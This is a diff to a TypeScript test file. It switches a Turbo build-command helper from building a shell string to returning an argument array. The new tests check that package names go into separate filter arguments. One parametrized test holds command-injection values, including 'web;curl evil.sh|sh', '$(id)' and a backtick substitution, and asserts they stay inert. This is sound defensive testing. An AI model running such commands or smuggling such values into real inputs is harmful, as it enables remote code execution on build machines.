@@ -6,7 +6,7 @@ import type { NormalizedWorkspace } from '../../workspace/types.js';
 import {
 	type AppBuildResult,
 	detectPackageManager,
-	getTurboCommand,
+	getTurboArgs,
 } from '../index.js';
 
 describe('Workspace Build Command', () => {
@@ -52,35 +52,58 @@ describe('Workspace Build Command', () => {
 		});
 	});
 
-	describe('getTurboCommand', () => {
-		it('should generate pnpm turbo command', () => {
-			expect(getTurboCommand('pnpm')).toBe('pnpm exec turbo run build');
+	describe('getTurboArgs', () => {
+		it('runs turbo through each package manager', () => {
+			expect(getTurboArgs('pnpm')).toEqual([
+				'pnpm',
+				['exec', 'turbo', 'run', 'build'],
+			]);
+			expect(getTurboArgs('yarn')).toEqual(['yarn', ['turbo', 'run', 'build']]);
+			expect(getTurboArgs('npm')).toEqual(['npx', ['turbo', 'run', 'build']]);
 		});
 
-		it('should generate yarn turbo command', () => {
-			expect(getTurboCommand('yarn')).toBe('yarn turbo run build');
+		it('names each package as its own filter argument', () => {
+			expect(
+				getTurboArgs('pnpm', ['@myapp/web', 'site'], { only: true }),
+			).toEqual([
+				'pnpm',
+				[
+					'exec',
+					'turbo',
+					'run',
+					'build',
+					'--filter=@myapp/web',
+					'--filter=site',
+					'--only',
+				],
+			]);
+			expect(getTurboArgs('npm', '@myapp/api')[1]).toEqual([
+				'turbo',
+				'run',
+				'build',
+				'--filter=@myapp/api',
+			]);
 		});
 
-		it('should generate npm turbo command', () => {
-			expect(getTurboCommand('npm')).toBe('npx turbo run build');
-		});
+		it.each([
+			['a shell separator', 'web;curl evil.sh|sh'],
+			['a command substitution', '$(id)'],
+			['a backtick', '`id`'],
+			['a space', 'web --force'],
+			['a leading dash', '--force'],
+		])('keeps a package name holding %s inside one filter argument', (_, name) => {
+			const [bin, args] = getTurboArgs('pnpm', [name]);
 
-		it('should add filter argument when provided', () => {
-			expect(getTurboCommand('pnpm', 'api')).toBe(
-				'pnpm exec turbo run build --filter=api',
-			);
-		});
-
-		it('should add filter for yarn', () => {
-			expect(getTurboCommand('yarn', 'web')).toBe(
-				'yarn turbo run build --filter=web',
-			);
-		});
-
-		it('should add filter for npm', () => {
-			expect(getTurboCommand('npm', '@myapp/api')).toBe(
-				'npx turbo run build --filter=@myapp/api',
-			);
+			expect(bin).toBe('pnpm');
+			// One element, `--filter=` and all: turbo reads it as a filter value,
+			// and no shell ever sees it.
+			expect(args).toEqual([
+				'exec',
+				'turbo',
+				'run',
+				'build',
+				`--filter=${name}`,
+			]);
 		});
 	});
 
